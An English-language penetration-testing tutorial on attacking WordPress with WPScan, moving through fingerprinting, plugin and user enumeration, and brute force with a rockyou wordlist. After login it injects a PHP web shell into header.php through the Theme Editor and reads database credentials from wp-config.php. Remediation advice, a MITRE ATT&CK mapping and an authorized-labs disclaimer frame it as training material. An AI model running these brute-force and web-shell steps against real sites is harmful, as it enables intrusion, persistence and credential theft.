> **English** | [Italiano](README.md)

# CMS Exploitation: WordPress & WPScan

> - **Phase:** Web Attack - CMS Exploitation (WordPress)
> - **Visibility:** Medium - WPScan generates structured HTTP traffic, detectable by WAF and IDS
> - **Prerequisites:** WordPress identified during the tech profiling phase, `/wp-login.php` page accessible, WPScan API token (optional for additional plugin data)
> - **Output:** WordPress version, plugin list with CVEs, user list, potential admin access via brute force

---

## Introduction

WordPress is the most widely used CMS in the world, with over 43% of the web market. Its popularity makes it the most frequent target in web application penetration tests. Its plugin-based architecture introduces a fragmented attack surface: the WordPress core is generally secure in recent versions, but vulnerabilities are almost always found in third-party plugins.

The attack cycle on WordPress follows four distinct phases, each with specific tools:

1. **Fingerprinting:** confirm the WordPress version and identify the active theme.
2. **Enumeration:** installed plugins (and their versions), users, exposed configuration files.
3. **CVE verification:** cross-reference the discovered versions with the WPScan known vulnerability database.
4. **Exploitation:** brute force on admin credentials, or direct exploitation of a vulnerable plugin.

WPScan is the de facto tool for this task: an open-source black-box scanner written in Ruby, specifically designed for WordPress, with a vulnerability database updated daily (wpscan.com/wordpress-security-database).

---

## Phase 1: Fingerprinting

Version confirmation is the prerequisite for CVE mapping. WordPress exposes its version in multiple locations:

```Bash
# Version identification via WhatWeb
whatweb -v http://<TARGET>

# Direct check of files that expose the version
curl -s http://<TARGET>/readme.html | grep -i "version"
curl -s http://<TARGET>/wp-includes/version.php
```

Sample output (readme.html):

```
WordPress 6.2.2
...
WordPress is web software you can use to create a beautiful website, blog, or app.
```

The `readme.html` file is often left accessible by default and reveals the exact version. In a real engagement, its removal is one of the first remediations to recommend.

---

## Phase 2: Enumeration with WPScan

### Installation

```Bash
# On Kali Linux (pre-installed)
wpscan --version

# Update vulnerability database
wpscan --update
```

### Full Enumeration

```Bash
# Basic scan with enumeration of vulnerable plugins, themes, and users
wpscan --url http://<TARGET> --enumerate vp,vt,u

# Options:
#   vp  = vulnerable plugins (plugins with known CVEs)
#   vt  = vulnerable themes (themes with known CVEs)
#   u   = users (user enumeration)
#   ap  = all plugins (all plugins, even without CVEs)
#   at  = all themes
```

Sample output (plugin enumeration):

```
[+] Enumerating Vulnerable Plugins

[i] Plugin(s) Identified:

[+] contact-form-7
 | Location: http://target.com/wp-content/plugins/contact-form-7/
 | Last Updated: 2023-11-20T09:00:00.000Z
 | [!] The version is out of date, the latest version is 5.8.4
 | Version: 5.7.4 (100% confidence)                               <-- outdated version
 |
 | Found By: Readme File Disclosure (Aggressive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Contact Form 7 <= 5.8.3 - Reflected Cross-Site Scripting   <-- CVE
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/xxxxx
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-XXXXX
```

### User Enumeration

```Bash
wpscan --url http://<TARGET> --enumerate u
```

Sample output:

```
[+] Enumerating Users

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Login Error Messages (Aggressive Detection)
 |  WP JSON API (Aggressive Detection) -> http://target.com/?author=1

[+] editor_john
 | Found By: Author Posts - Author Pattern (Passive Detection)       <-- exposed username
```

The fact that WordPress exposes usernames through the REST API (`/?author=1`) is a structural misconfiguration that facilitates credential brute forcing.

---

## Phase 3: Credential Brute Force

```Bash
# Brute force with password list (rockyou.txt or custom list)
wpscan --url http://<TARGET> --usernames admin,editor_john --passwords /usr/share/wordlists/rockyou.txt

# With throttling to avoid lockout
wpscan --url http://<TARGET> --usernames admin -P passlist.txt --throttle 3000
# --throttle 3000 -> wait 3 seconds between each attempt
```

Sample output (credential found):

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / password123                             <-- VALID CREDENTIAL

[!] Valid Combinations Found:
 | Username: admin, Password: password123
```

---

## Phase 4: Post-Authentication Exploitation

Once admin access is obtained, the most common post-exploitation actions:

**Web Shell Deployment via Theme Editor:**

```Bash
# 1. Navigate to: Appearance -> Theme Editor -> header.php (or functions.php)
# 2. Inject PHP code to execute system commands:
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
# 3. Call the Web Shell:
#    http://<TARGET>/wp-content/themes/<THEME>/header.php?cmd=id
```

**Database access via phpMyAdmin (if exposed):**

```Bash
# Check if phpMyAdmin is accessible
curl -s http://<TARGET>/phpmyadmin/
curl -s http://<TARGET>/pma/
```

**Credential dump from `wp-config.php`:**

```Bash
# If RCE is available, read the database credentials
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"
```

---

## Remediation

- **Immediate action:** remove `readme.html` and all files that expose the version (`/wp-includes/version.php` must be inaccessible via web).
- **Updates:** keep WordPress core, all plugins, and themes up to date. Enable automatic updates for security patches.
- **Usernames:** disable user enumeration through the REST API: add a rule in `.htaccess` or use a security plugin (Wordfence, Sucuri) to block `/?author=N`.
- **Login:** protect `/wp-login.php` with CAPTCHA, 2FA (Google Authenticator), and IP allowlisting for admin access. Consider moving the login to a custom URL (plugin `WPS Hide Login`).
- **Principle of least privilege:** remove unused plugins and themes. Fewer plugins = smaller attack surface.
- **Verification:** re-run `wpscan --enumerate vp` after each update to confirm there are no remaining plugins with known CVEs.

---

## Reference Tools

| Tool | Type | Technique/Access | Primary Use Case |
| :--- | :--- | :--- | :--- |
| `wpscan` | WordPress scanner | CLI - Active | Full enumeration and brute force on WordPress |
| `nuclei` | Template-based | CLI - Active | Templates `/technologies/cms/wordpress/` for specific CVEs |
| `metasploit` | Exploitation framework | CLI/GUI - Active | Automated exploits for vulnerable WordPress plugins |
| `burpsuite` | Web proxy | GUI - Manual | Manual analysis of WordPress features (IDOR, CSRF) |
| `xmlrpc-scan` | XML-RPC tester | CLI - Active | Testing abuse of the `xmlrpc.php` endpoint for brute force |

> **WPScan API Token Note:** without an API token, WPScan does not show specific CVEs for plugins. Register for free at `wpscan.com` and add `--api-token <TOKEN>` to the command to enable the full vulnerability database.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Reconnaissance | Active Scanning: Vulnerability Scanning | `T1595.002` | Scanning with WPScan to identify vulnerable plugins, WordPress version, and associated CVEs |
| Reconnaissance | Gather Victim Host Info: Software | `T1592.002` | WordPress version fingerprinting via `readme.html` and HTTP headers |
| Discovery | Account Discovery | `T1087` | WordPress username enumeration through the REST API (`/?author=1`) with WPScan `--enumerate u` |
| Credential Access | Brute Force: Password Guessing | `T1110.001` | Dictionary attack on `/wp-login.php` with credential list via WPScan |
| Persistence | Server Software Component: Web Shell | `T1505.003` | PHP code deployment in the WordPress Theme Editor after admin access to maintain persistence |
| Execution | Command and Scripting Interpreter: PHP | `T1059.006` | System command execution through PHP Web Shell injected into the theme's `header.php` |

---

> **Note:** The techniques documented in this guide were practiced on WordPress instances
> installed in local lab environments and on authorized practice platforms (e.g.,
> HackTheBox, TryHackMe, DVWP - Damn Vulnerable WordPress). Using WPScan on real
> WordPress sites without the written authorization of the owner is prohibited and constitutes
> a criminal offense under Italian Criminal Code art. 615-ter and the Computer Fraud and Abuse
> Act (CFAA) for US targets.
